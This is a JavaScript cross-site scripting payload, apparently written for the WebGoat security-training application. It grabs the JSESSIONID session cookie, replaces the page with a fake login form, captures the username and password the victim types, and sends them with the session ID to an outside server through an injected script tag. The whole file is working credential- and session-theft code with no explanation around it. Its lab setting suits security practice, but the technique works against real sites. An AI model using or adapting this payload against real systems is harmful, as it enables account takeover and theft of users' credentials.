console.log('Hacked');
var worm = document.createElement('script')
var cookie = goatRouter.lessonController.cookieView.collection.findWhere({name:'JSESSIONID'}).attributes
var stolenInformation = {};
var bodyBackup;
//goatRouter.lessonController.cookieView.collection.each(function(model){cookies.push(model.attributes)});
$.ajax({
    url:'/WebGoat',
    success: function(data){
        bodyBackup = $('body').html();
        console.log('buu',bodyBackup.length);
        $('body').html(data);
        $('form').find('button').click(function(e){
            e.preventDefault();
            $('.form-control').each(function(item){
                stolenInformation[this.name] = this.value;
            })
            stolenInformation.session = cookie.value;
            worm.setAttribute('src','http://localhost:3000/final.js?'
                +'session='+stolenInformation.session
                +'&username='+stolenInformation.username
                +'&password='+stolenInformation.password);
            document.body.appendChild(worm);
            window.location.reload();

        })
    }
})

